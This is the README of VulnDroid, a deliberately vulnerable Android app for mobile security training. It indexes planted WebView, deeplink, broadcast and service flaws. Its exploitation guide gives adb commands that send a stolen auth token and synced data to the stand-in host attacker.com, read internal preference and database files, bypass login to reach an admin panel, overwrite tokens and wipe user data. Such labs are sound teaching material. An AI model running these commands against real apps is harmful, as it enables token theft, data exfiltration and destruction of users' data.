# VulnDroid 🔓

A deliberately vulnerable Android application for security researchers, bug bounty hunters, and mobile penetration testers. Covers OWASP Mobile Top 10 vulnerabilities focusing on **WebView abuse**, **deeplink hijacking**, and **intent vulnerabilities**.

> ⚠️ **For educational and authorized testing only.** Do not install on production devices.

---

## Vulnerabilities Index

| ID | Category | File | Severity |
|----|----------|------|----------|
| VULN-WV-01 | JavaScript enabled, no origin validation | WebViewActivity.java | High |
| VULN-WV-02 | Exposed JavascriptInterface bridge | WebViewActivity.java | Critical |
| VULN-WV-03 | Universal file access from file:// URLs | WebViewActivity.java | High |
| VULN-WV-04 | Arbitrary URL loaded from Intent extra | WebViewActivity.java | High |
| VULN-WV-05 | Deeplink loads attacker-controlled URL in WebView | WebViewActivity.java | High |
| VULN-DL-01 | Deeplink params forwarded to target activity | DeeplinkActivity.java | High |
| VULN-DL-02 | Arbitrary activity launch via redirect param | DeeplinkActivity.java | Critical |
| VULN-DL-03 | Auth token overwrite via deeplink | DeeplinkActivity.java | Critical |
| VULN-DL-04 | No origin/referrer check on deeplink | DeeplinkActivity.java | Medium |
| VULN-AP-01 | Exported AdminPanel, no permission | AdminPanelActivity.java | Critical |
| VULN-AP-02 | Hardcoded API keys and credentials | AdminPanelActivity.java | Critical |
| VULN-AP-03 | No authentication before admin UI | AdminPanelActivity.java | High |
| VULN-BR-01 | Exported BroadcastReceiver, no permission | TokenReceiver.java | High |
| VULN-BR-02 | Token injection via broadcast | TokenReceiver.java | Critical |
| VULN-BR-03 | Sensitive data in logs (adb logcat) | TokenReceiver.java | Medium |
| VULN-SV-01 | Exported Service, no permission | DataSyncService.java | High |
| VULN-SV-02 | Arbitrary action trigger via intent extra | DataSyncService.java | Critical |
| VULN-SV-03 | No caller identity verification | DataSyncService.java | High |

---

## Setup

### Requirements
- Android Studio Hedgehog or later
- Android device or emulator running API 24+
- ADB installed

### Build & Install
```bash
git clone https://github.com/YOUR_USERNAME/VulnDroid.git
cd VulnDroid
./gradlew assembleDebug
adb install app/build/outputs/apk/debug/app-debug.apk
```

---

## Exploitation Guide

### 1. WebView — JavaScript Bridge Theft (VULN-WV-02 + WV-04)

Steal the victim's auth token by loading a `javascript:` URL into the exported WebView:

```bash
adb shell am start -n com.vulndroid.app/.activities.WebViewActivity \
    --es "url" "javascript:document.location='http://attacker.com/?t='+VulnBridge.stealToken()"
```

**What happens:** The `VulnBridge` Java object is exposed to all JavaScript. Any page — or JavaScript URL — can call `stealToken()` and read `SharedPreferences`.

---

### 2. WebView — Local File Read (VULN-WV-03)

Read internal app files via `file://` URL:

```bash
# Read SharedPreferences
adb shell am start -n com.vulndroid.app/.activities.WebViewActivity \
    --es "url" "file:///data/data/com.vulndroid.app/shared_prefs/user_prefs.xml"

# Read databases
adb shell am start -n com.vulndroid.app/.activities.WebViewActivity \
    --es "url" "file:///data/data/com.vulndroid.app/databases/"
```

---

### 3. Deeplink — Arbitrary Activity Launch (VULN-DL-02)

Open the protected Admin Panel via a deeplink redirect — no auth needed:

```bash
adb shell am start -a android.intent.action.VIEW \
    -d "vulndroid://settings?redirect=com.vulndroid.app.activities.AdminPanelActivity"
```

**Chain with WebView:** Redirect to WebView and supply a malicious URL:

```bash
adb shell am start -a android.intent.action.VIEW \
    -d "vulndroid://settings?redirect=com.vulndroid.app.activities.WebViewActivity&url=javascript:VulnBridge.stealToken()"
```

---

### 4. Deeplink — Auth Token Hijack (VULN-DL-03)

Overwrite the victim's token with an attacker-controlled value:

```bash
adb shell am start -a android.intent.action.VIEW \
    -d "vulndroid://settings?token=ATTACKER_CONTROLLED_TOKEN"
```

---

### 5. Exported Activity — Admin Panel Access (VULN-AP-01)

Directly launch the admin panel (bypasses all login):

```bash
adb shell am start -n com.vulndroid.app/.activities.AdminPanelActivity
```

Displays hardcoded API key, DB password, and internal API URL.

---

### 6. BroadcastReceiver — Token Injection (VULN-BR-02)

Any installed app or ADB can send a broadcast to overwrite the auth token:

```bash
adb shell am broadcast -a com.vulndroid.app.SEND_TOKEN \
    --es "token" "FAKE_ADMIN_TOKEN" \
    --es "user" "admin"
```

---

### 7. Exported Service — Data Wipe / Exfil (VULN-SV-02)

Trigger a full user data wipe from outside the app:

```bash
adb shell am startservice \
    -n com.vulndroid.app/.services.DataSyncService \
    --es "action" "wipe_user_data"
```

Exfiltrate data to an attacker server (SSRF-like):

```bash
adb shell am startservice \
    -n com.vulndroid.app/.services.DataSyncService \
    --es "action" "sync" \
    --es "endpoint" "http://attacker.com/collect"
```

---

## Recommended Testing Tools

| Tool | Use |
|------|-----|
| [drozer](https://github.com/WithSecureLabs/drozer) | Intent fuzzing, component enumeration |
| [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) | Static + dynamic analysis |
| [apktool](https://apktool.org/) | Decompile APK, read manifest |
| [jadx](https://github.com/skylot/jadx) | Decompile to readable Java |
| [Frida](https://frida.re/) | Dynamic instrumentation, hook methods |
| [Burp Suite](https://portswigger.net/burp) | Intercept WebView network traffic |

---

## OWASP Mobile Top 10 Coverage

| OWASP ID | Title | Covered |
|----------|-------|---------|
| M1 | Improper Credential Usage | ✅ Hardcoded keys (VULN-AP-02) |
| M2 | Inadequate Supply Chain Security | — |
| M3 | Insecure Authentication / Authorization | ✅ No auth on admin (VULN-AP-03) |
| M4 | Insufficient Input/Output Validation | ✅ Unvalidated intent extras |
| M5 | Insecure Communication | ✅ cleartext traffic allowed |
| M6 | Inadequate Privacy Controls | ✅ Token logged (VULN-BR-03) |
| M7 | Insufficient Binary Protections | ✅ debuggable=true |
| M8 | Security Misconfiguration | ✅ Exported components |
| M9 | Insecure Data Storage | ✅ Sensitive data in SharedPrefs |
| M10 | Insufficient Cryptography | — |

---

## License

MIT — free to fork, modify, and use in security training.

---

## Documentation

- [ARCHITECTURE.md](ARCHITECTURE.md) — How each vulnerable component works internally
- [MITIGATIONS.md](MITIGATIONS.md) — Fix/remediation guidance for every vulnerability
- [SECURITY.md](SECURITY.md) — Security policy & responsible disclosure
- [CHECKSUMS.txt](CHECKSUMS.txt) — SHA256 checksums for built APKs


## Disclaimer

This project is purely educational. All vulnerabilities are intentional and documented. Techniques shown here apply to real apps, but only test systems you own or are authorized to test. See SECURITY.md for full disclaimer and responsible disclosure guidance.
